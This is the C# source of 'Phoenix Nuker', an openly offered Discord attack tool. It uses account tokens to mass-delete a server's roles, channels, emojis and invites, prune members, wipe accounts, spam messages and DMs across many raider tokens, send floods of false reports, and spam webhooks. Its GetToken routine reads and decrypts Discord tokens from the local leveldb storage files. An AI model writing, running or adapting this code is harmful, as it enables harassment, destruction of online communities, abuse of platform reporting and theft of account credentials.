using System;
using System.IO;
using System.Net;
using System.Threading;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Http;
using System.Diagnostics;
using System.Reflection;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Linq;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;

/* 
       │ Author       : extatent
       │ Name         : phoenix-nuker
       │ GitHub       : https://github.com/extatent
*/

namespace nuker
{
    class Program
    {
        #region Configs
        public static string version = "6";
        public static string token;
        public static int WaitTimeLong = 2000;

        class config
        {
            public string token { get; set; }
        }

        public static void GetConfig()
        {
            StreamReader read = new StreamReader("config.json");
            string json = read.ReadToEnd();
            config config = JsonConvert.DeserializeObject<config>(json);
            token = config.token;
            read.Close();
        }

        public static void SaveConfig(string token)
        {
            config config = new config
            {
                token = token,
            };

            var responseData = config;
            string jsonData = JsonConvert.SerializeObject(responseData);
            File.WriteAllText("config.json", jsonData);
        }

        static List<string> clients = new List<string>();
        static string guildid;
        #endregion

        #region Write Logo, Write Line
        static void WriteLogo()
        {
            Console.Clear();
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
            string phoenix = @"                                  ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
                                  ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
                                  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                  ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
" + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
" + " > Discord: discord.gg/FT9UZAxAhx " + @"╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                      ";
            Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 16);
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine();
        }
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Console.Title = "Phoenix Nuker";
            CheckVersion();
            Start();
        }
        #endregion

        #region Update
        static void CheckVersion()
        {
            try
            {
                WebClient web = new WebClient();

                if (!web.DownloadString("https://raw.githubusercontent.com/extatent/phoenix-nuker/main/version").Contains(version))
                {
                    int v2 = int.Parse(version) + 1;
                    Console.Title = "Phoenix Nuker | New version is available";
                    Console.Clear();
                    WriteLogo();
                    Console.WriteLine("New update is available: " + version + " > " + v2);
                    Console.WriteLine();
                    Console.WriteLine("Press any key to open Phoenix Nuker GitHub.");
                    Console.ReadKey();
                    Process.Start("https://github.com/extatent/phoenix-nuker/");
                    Environment.Exit(0);
                }
            }
            catch
            {
                Console.Clear();
                WriteLogo();
                Console.WriteLine("Please check your internet connection.");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
        #endregion

        #region Start
        static void Start()
        {
            WriteLogo();
            Console.ForegroundColor = Color.Yellow;
            string config = "config.json";
            if (!File.Exists(config))
            {
                try
                {
                    File.Create(config).Dispose();
                    File.WriteAllText(config, "{\"token\":\"\"}");
                }
                catch
                {
                    Environment.Exit(0);
                }
            }

            string tokens = "tokens.txt";
            if (!File.Exists(tokens))
            {
                try
                {
                    File.Create(tokens).Dispose();
                }
                catch
                {
                    Environment.Exit(0);
                }
            }

            GetConfig();

            try
            {
                Console.WriteLine("{0,-20} {1,32}", "|[01] Login with config token", "|[02] Login with your token");
                Console.WriteLine("{0,-20} {1,31}", "|[03] MultiToken Raider", "|[04] Fetch User IDs");
                Console.WriteLine("|[05] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int options = int.Parse(Console.ReadLine());
                switch (options)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(WaitTimeLong);
                        Console.Clear();
                        Start();
                        break;
                    case 1:
                        if (string.IsNullOrEmpty(token))
                        {
                            try
                            {
                                Console.Clear();
                                WriteLogo();
                                Console.Write("Token: ");
                                string t0ken = Console.ReadLine();

                                if (t0ken.Contains("\""))
                                {
                                    t0ken = t0ken.Replace("\"", "");
                                }

                                SaveConfig(t0ken);
                                token = t0ken;
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                                Thread.Sleep(WaitTimeLong);
                                if (File.Exists("config.json"))
                                {
                                    File.Delete("config.json");
                                }
                                Start();
                            }
                        }
                        break;
                    case 2:
                        try
                        {
                            token = GetToken();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                            Start();
                        }
                        break;
                    case 3:
                        var list = File.ReadAllLines("tokens.txt");
                        int count = 0;
                        foreach (var token in list)
                        {
                            count++;
                            clients.Add(token);
                        }
                        if (count == 0)
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("Paste your tokens in tokens.txt file.");
                            Thread.Sleep(WaitTimeLong);
                            Start();
                        }
                        Console.Title = "Phoenix Nuker | Total Accounts: " + count;
                        Raider();
                        break;
                    case 4:
                        if (!File.Exists("serverids.txt"))
                        {
                            File.Create("serverids.txt").Dispose();
                        }
                        var ids = File.ReadAllLines("serverids.txt");
                        foreach (string id in ids)
                        {
                            Server.GetIDs(token, id);
                        }
                        if (string.IsNullOrEmpty(File.ReadAllText("serverids.txt")))
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("Paste server IDs in serverids.txt file.");
                            Thread.Sleep(WaitTimeLong);
                            Start();
                        }
                        Start();
                        break;
                    case 5:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Start();
            }

            WriteLogo();
            Options();
        }
        #endregion

        #region Options
        static void Options()
        {
            try
            {
                Console.Clear();
                WriteLogo();
                Console.Title = $"Phoenix Nuker | " + User.GetUsername(token);
                Console.WriteLine("{0,-20} {1,34}", "|[01] Account nuker", "|[02] Server nuker");
                Console.WriteLine("{0,-20} {1,37}", "|[03] Report bot", "|[04] Webhook spammer");
                Console.WriteLine("{0,-20} {1,18}", "|[05] Login to other account", "|[06] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        DoneMethod4();
                        break;
                    case 1:
                        try
                        {
                            Console.Title = $"Phoenix Nuker | {User.GetUsername(token)}";
                            Console.Clear();
                            AccountNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 2:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            if (string.IsNullOrEmpty(guildid))
                            {
                                Console.Write("Guild ID: ");
                                string GuildID = Console.ReadLine();
                                guildid = GuildID;
                            }
                            if (Server.GetServerName(token, guildid) == "N/A")
                            {
                                Console.Clear();
                                WriteLogo();
                                Console.WriteLine("Invalid ID or you're not in the server.");
                                Thread.Sleep(WaitTimeLong);
                                Options();
                            }
                            Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
                            Console.Clear();
                            ServerNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 3:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Guild ID: ");
                            string guildID = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            string channelid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            string messageid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string reason = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Reports count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            HttpRequest httpRequest = new HttpRequest();
                            httpRequest.Authorization = token;
                            httpRequest.UserAgentRandomize();
                            string url = $"https://discord.com/api/v{Config.APIVersion}/report";

                            string jsonData = string.Concat(new string[]
                            {
                                "{\"channel_id\": \"",
                                channelid,
                                "\", \"guild_id\": \"",
                                guildID,
                                "\", \"message_id\": \"",
                                messageid,
                                "\", \"reason\": \"",
                                reason,
                                "\" }"
                            });

                            int reports = 0;
                            for (int i = 0; i < count; i++)
                            {
                                try
                                {
                                    HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
                                    bool status = response.StatusCode.ToString() == "Created";
                                    if (status)
                                    {
                                        reports++;
                                        Console.WriteLine("Reports sent: " + reports);
                                    }
                                }
                                catch
                                { }
                            }
                            Console.Title = $"Phoenix Nuker | {User.GetUsername(token)}";
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 4:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Webhook: ");
                            string webhook = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string message = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            string mcount = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();

                            int total = 0;
                            for (int i = 0; i < int.Parse(mcount); i++)
                            {
                                try
                                {
                                    total++;
                                    Webhook hook = new Webhook(webhook);
                                    hook.SendMessage(message);
                                    Console.WriteLine("Messages sent: " + total);
                                    Thread.Sleep(WaitTimeLong);
                                }
                                catch { }
                            }
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 5:
                        if (File.Exists("config.json"))
                        {
                            File.Delete("config.json");
                        }
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                        break;
                    case 6:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Options();
            }
        }
        #endregion

        #region Webhook class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new System.Net.Http.StringContent("Phoenix Nuker"), "username");
                data.Add(new System.Net.Http.StringContent(content), "content");
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
            }
        }
        #endregion

        #region Done methods
        static void DoneMethod()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            AccountNuker();
        }

        static void DoneMethod2()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            ServerNuker();
        }

        static void DoneMethod3()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Options();
        }

        static void DoneMethod4()
        {
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Options();
        }

        static void DoneMethod5()
        {
            Console.WriteLine("Done");
            Thread.Sleep(WaitTimeLong);
            Console.Clear();
            Raider();
        }
        #endregion

        #region Raider
        static void Raider()
        {
            try
            {
                Console.Clear();
                WriteLogo();

                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine("{0,-20} {1,25}", "|[01] Join Guild", "|[02] Leave Guild");
                Console.WriteLine("{0,-20} {1,18}", "|[03] Add Friend", "|[04] Spam");
                Console.WriteLine("{0,-20} {1,24}", "|[05] Add Reaction", "|[06] Join Group");
                Console.WriteLine("{0,-20} {1,21}", "|[07] Block User", "|[08] DM User");
                Console.WriteLine("{0,-20} {1,23}", "|[09] Leave Group", "|[10] Fake Type");
                Console.WriteLine("{0,-20} {1,18}", "|[11] Go Back", "|[12] Exit");

                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(WaitTimeLong);
                        Console.Clear();
                        Raider();
                        break;
                    case 1:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Invite code: ");
                            string code = Console.ReadLine();
                            if (code.Contains("https://discord.gg/"))
                            {
                                code = code.Replace("https://discord.gg/", "");
                            }
                            if (code.Contains("https://discord.com/invite/"))
                            {
                                code = code.Replace("https://discord.com/invite/", "");
                            }
                            Console.Clear();
                            WriteLogo();
                            foreach (var joinguild in clients)
                            {
                                Raid.JoinGuild(joinguild, code);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 2:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Guild ID: ");
                            ulong id = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.LeaveGuild(token, id);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 3:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Username#TAG: ");
                            string full = Console.ReadLine();
                            string user = full.Split('#')[0];
                            uint discriminator = uint.Parse(full.Split('#')[1]);
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.AddFriend(token, user, discriminator);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 4:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            for (int i = 0; i < count; i++)
                            {
                                foreach (var token in clients)
                                {
                                    Raid.SendMessage(token, cid, msg);
                                }
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 5:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid2 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            ulong mid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("[1] Heart\n[2] White Check Mark\n[3] Regional Indicator L\n[4] Regional Indicator W\n[5] Middle Finger\n[6] Billed Cap\n[7] Negative Squared Cross Mark\n[8] Neutral Face\n[9] Nerd Face\n[10] Joy");
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string choice = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            if (choice == "1")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "❤️");
                                }
                            }
                            if (choice == "2")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "✅");
                                }
                            }
                            if (choice == "3")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🇱");
                                }
                            }
                            if (choice == "4")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🇼");
                                }
                            }
                            if (choice == "5")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🖕");
                                }
                            }
                            if (choice == "6")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🧢");
                                }
                            }
                            if (choice == "7")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "❎");
                                }
                            }
                            if (choice == "8")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "😐");
                                }
                            }
                            if (choice == "9")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🤓");
                                }
                            }
                            if (choice == "10")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "😂");
                                }
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 6:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Invite code: ");
                            string inv = Console.ReadLine();
                            if (inv.Contains("https://discord.gg/"))
                            {
                                inv = inv.Replace("https://discord.gg/", "");
                            }
                            if (inv.Contains("https://discord.com/invite/"))
                            {
                                inv = inv.Replace("https://discord.com/invite/", "");
                            }
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.JoinGroup(token, inv);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 7:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid2 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.BlockUser(token, uid2);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 8:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {

                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 9:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Group ID: ");
                            ulong gid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.LeaveGroup(token, gid);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 10:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.TriggerTyping(token, cid);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(WaitTimeLong);
                        }
                        Raider();
                        break;
                    case 11:
                        Console.Title = "Phoenix Nuker";
                        Start();
                        break;
                    case 12:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(WaitTimeLong);
                Raider();
            }
        }
        #endregion

        #region Account nuker
        static void AccountNuker()
        {
            WriteLogo();

            Console.ForegroundColor = Color.Yellow;
            Console.WriteLine("{0,-20} {1,35}", "|[01] Edit Profile", "|[02] Leave/Delete Guilds");
            Console.WriteLine("{0,-20} {1,26}", "|[03] Clear Relationships", "|[04] Leave HypeSquad");
            Console.WriteLine("{0,-20} {1,28}", "|[05] Remove Connections", "|[06] Deauthorize Apps");
            Console.WriteLine("{0,-20} {1,24}", "|[07] Mass Create Guilds", "|[08] Seizure Mode");
            Console.WriteLine("{0,-20} {1,23}", "|[09] Confuse Mode", "|[10] Mass DM");
            Console.WriteLine("{0,-20} {1,35}", "|[11] User Info", "|[12] Block Relationships");
            Console.WriteLine("{0,-20} {1,23}", "|[13] Delete DMs", "|[14] Go Back");
            Console.WriteLine("|[15] Exit");

            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(WaitTimeLong);
                    Console.Clear();
                    AccountNuker();
                    break;
                case 1:
                    Console.Clear();
                    WriteLogo();
                    Console.WriteLine("HypeSquad:\n[0] None\n[1] Bravery\n[2] Brilliance\n[3] Balance");
                    Console.WriteLine();
                    Console.Write("Your choice: ");
                    string hypesquad = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Biography: ");
                    string bio = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Custom Status: ");
                    string status = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    User.EditProfile(token, hypesquad, bio, status);
                    DoneMethod();
                    break;
                case 2:
                    Console.Clear();
                    WriteLogo();
                    User.LeaveDeleteGuilds(token);
                    DoneMethod();
                    break;
                case 3:
                    Console.Clear();
                    WriteLogo();
                    User.ClearRelationships(token);
                    DoneMethod();
                    break;
                case 4:
                    Console.Clear();
                    WriteLogo();
                    User.LeaveHypeSquad(token);
                    DoneMethod();
                    break;
                case 5:
                    Console.Clear();
                    WriteLogo();
                    User.RemoveConnections(token);
                    DoneMethod();
                    break;
                case 6:
                    Console.Clear();
                    WriteLogo();
                    User.DeauthorizeApps(token);
                    DoneMethod();
                    break;
                case 7:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 100): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            numb++;
                            User.CreateGuild(token, name);
                            Console.WriteLine($"Created: {numb}");
                        }

                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 8:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count: ");
                        string count = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < int.Parse(count); i++)
                        {
                            numb++;
                            User.ChangeTheme(token, "light");
                            User.ChangeTheme(token, "dark");
                            Console.WriteLine($"Changed: {numb}");
                        }
                    }
                    catch { }
                    DoneMethod();
                    break;
                case 9:
                    Console.Clear();
                    WriteLogo();
                    User.ConfuseMode(token);
                    DoneMethod();
                    break;
                case 10:
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Message: ");
                    string message = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    User.MassDM(token, message);
                    DoneMethod();
                    break;
                case 11:
                    Console.Clear();
                    WriteLogo();
                    User.UserInformation(token);
                    AccountNuker();
                    break;
                case 12:
                    Console.Clear();
                    WriteLogo();
                    User.BlockRelationships(token);
                    DoneMethod();
                    break;
                case 13:
                    Console.Clear();
                    WriteLogo();
                    User.DeleteDMs(token);
                    DoneMethod();
                    break;
                case 14:
                    Console.Clear();
                    WriteLogo();
                    Options();
                    break;
                case 15:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Server Nuker
        static void ServerNuker()
        {
            WriteLogo();

            Console.ForegroundColor = Color.Yellow;
            Console.WriteLine("{0,-20} {1,30}", "|[01] Delete All Roles", "|[02] Remove All Bans");
            Console.WriteLine("{0,-20} {1,29}", "|[03] Delete All Channels", "|[04] Delete All Emojis");
            Console.WriteLine("{0,-20} {1,30}", "|[05] Delete All Invites", "|[06] Mass Create Roles");
            Console.WriteLine("{0,-20} {1,24}", "|[07] Mass Create Channels", "|[08] Prune Members");
            Console.WriteLine("{0,-20} {1,32}", "|[09] Remove Integrations", "|[10] Delete All Reactions");
            Console.WriteLine("{0,-20} {1,36}", "|[11] Server Info", "|[12] Leave/Delete Server");
            Console.WriteLine("{0,-20} {1,26}", "|[13] Msg in every channel", "|[14] Delete Stickers");
            Console.WriteLine("{0,-20} {1,24}", "|[15] Mass DM", "|[16] Go Back");
            Console.WriteLine("|[17] Exit");

            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(WaitTimeLong);
                    Console.Clear();
                    ServerNuker();
                    break;
                case 1:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteRoles(token, guildid);
                    DoneMethod2();
                    break;
                case 2:
                    Console.Clear();
                    WriteLogo();
                    Server.RemoveBans(token, guildid);
                    DoneMethod2();
                    break;
                case 3:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteChannels(token, guildid);
                    DoneMethod2();
                    break;
                case 4:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteEmojis(token, guildid);
                    DoneMethod2();
                    break;
                case 5:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteInvites(token, guildid);
                    DoneMethod2();
                    break;
                case 6:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Role name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 250): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            try
                            {
                                numb++;
                                Server.CreateRole(token, guildid, name);
                                Console.WriteLine("Created: " + numb);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 7:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Channel name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 500): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            try
                            {
                                numb++;
                                Server.CreateChannel(token, guildid, name);
                                Console.WriteLine("Created: " + numb);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 8:
                    Console.Clear();
                    WriteLogo();
                    Server.PruneMembers(token, guildid);
                    DoneMethod2();
                    break;
                case 9:
                    Console.Clear();
                    WriteLogo();
                    Server.RemoveIntegrations(token, guildid);
                    DoneMethod2();
                    break;
                case 10:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Message: ");
                        string msgs = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Server.ServerDM(token, msgs);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(WaitTimeLong);
                    }
                    DoneMethod2();
                    break;
                case 11:
                    Console.Clear();
                    WriteLogo();
                    Server.ServerInformation(token, guildid);
                    ServerNuker();
                    break;
                case 12:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Your server (Y/N): ");
                        string owner = Console.ReadLine().ToLower();
                        Console.Clear();
                        WriteLogo();
                        Server.LeaveDeleteGuild(token, guildid, owner);
                        DoneMethod2();
                    }
                    catch { }
                    break;
                case 13:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.WriteLine("[1] Spam");
                        Console.WriteLine("[2] One Message");
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        string choice = Console.ReadLine();
                        if (choice == "1")
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Messages count: ");
                            string count = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            int total = 0;
                            for (int i = 0; i < int.Parse(count); i++)
                            {
                                try
                                {
                                    total++;
                                    Server.MsgInEveryChannel(token, guildid, msg);
                                }
                                catch { }
                            }
                        }
                        else
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Server.MsgInEveryChannel(token, guildid, msg);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(WaitTimeLong);
                    }
                    DoneMethod2();
                    break;
                case 14:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteStickers(token, guildid);
                    DoneMethod2();
                    break;
                case 15:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Message: ");
                        string msgs = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Server.ServerDM(token, msgs);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(WaitTimeLong);
                    }
                    break;
                case 16:
                    Console.Clear();
                    WriteLogo();
                    Options();
                    break;
                case 17:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Get Token
        static string GetToken()
        {
            string token = "";

            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match = EncryptedRegex.Match(contents);
                if (match.Success)
                {
                    token = DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                }
            }

            return token;
        }

